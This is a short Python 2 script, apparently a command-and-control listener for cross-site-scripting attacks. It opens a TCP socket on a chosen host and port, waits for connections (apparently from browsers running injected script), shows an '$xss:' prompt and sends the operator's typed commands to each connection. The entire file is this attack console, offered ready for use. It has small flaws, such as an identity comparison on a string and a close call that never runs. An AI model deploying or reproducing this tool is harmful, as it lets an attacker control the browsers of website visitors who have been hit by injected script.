import socket
import sys

args = sys.argv

if len(args) == 1:
	exit("Format is as follows:\npython xss.py -h IP -p PORT")

port = 1234
ip = ''

for arg in args:
	if arg == "-p":
		try:
			port = args[args.index(arg) + 1]
		except IndexError:
			exit("Please specify the port value after the -p flag")
	if arg == "-h":
		try:
			ip = args[args.index(arg) + 1]
		except IndexError:
			exit("Please specify the host value after the -h flag")
if ip is '':
	exit("Please supply the host value using the -h input flag")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
	port = int(port)
except ValueError:
	exit("Please specify an integer value for the -p flag")

s.bind((ip, int(port)))
s.listen(1)

print "[*] Listenin on port " + str(port) + "\n[*] The prompt will start appearing after a connection is made to the specified host (" + str(ip) + ")\n[*] Type 'exit' to exit the script"

def process_command(command):
	if command.lower() == "exit":
		exit("Script terminated successfully.")

while 1:
	conn, addr = s.accept()
	data = conn.recv(1024)
	out = raw_input("$xss: ")
	process_command(out)
	conn.send(out)

s.close
